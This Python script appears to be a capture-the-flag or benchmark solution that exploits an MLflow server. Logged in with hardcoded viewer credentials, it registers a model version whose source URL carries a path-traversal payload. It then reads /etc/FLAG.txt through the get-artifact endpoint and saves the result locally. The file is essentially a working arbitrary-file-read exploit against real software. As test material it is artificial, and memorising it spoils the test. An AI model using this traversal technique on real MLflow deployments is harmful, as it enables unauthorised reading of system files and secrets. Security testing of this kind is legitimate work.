import os
from random import randbytes
import sys
from requests import Session
import base64

url = "http://mlflow:5002"
path = "/etc/FLAG.txt"
ajax_api = f"{url}/ajax-api/2.0/mlflow"

# Authentication credentials
auth_username = "user_a"
auth_password = "ViewerAccessPasswordForUserA"
auth_header = {"Authorization": f"Basic {base64.b64encode(f'{auth_username}:{auth_password}'.encode()).decode()}"}

def write_to_flag_file(content):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
        
        flag_file_path = os.path.join(parent_dir, "FLAG.txt")
        
        with open(flag_file_path, "w", encoding="utf-8") as f:
            f.write(content)
        
        print(f"FLAG.txt successfully written to {flag_file_path}")
    except Exception as e:
        print(f"Failed to write FLAG.txt: {e}")

with Session() as s:
    # Add auth header to session
    s.headers.update(auth_header)
    
    experiment_name = "e_" + randbytes(4).hex()
    rsp = s.post(f"{ajax_api}/experiments/create", json={ "name" : experiment_name })
    experiment_id = rsp.json()["experiment_id"]

    rsp = s.post(f"{ajax_api}/runs/create", json={ "experiment_id" : experiment_id })
    run_uuid = rsp.json()["run"]["info"]["run_uuid"]

    rsp = s.post(f"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=xxx", data="whatever")
    rsp = s.post(f"{ajax_api}/experiments/delete", json={ "experiment_id" : experiment_id })

    # create a registered model and version:
    model_name = "m_" + randbytes(4).hex()
    rsp = s.post(f"{ajax_api}/registered-models/create", json={ "name" : model_name })

    rsp = s.post(f"{ajax_api}/model-versions/create", json={
        "name" : model_name,
        "source": f"http:///xxx%23/api/2.0/mlflow-artifacts/artifacts/../../../../../../../../../../../../"
    })

    rsp = s.get(f"{url}/model-versions/get-artifact", params={
        "name" : model_name,
        "version" : 1,
        "path" : path.removeprefix("/")
    })

    try:
        write_to_flag_file(rsp.content.decode())
    except UnicodeDecodeError:
        print(rsp.content)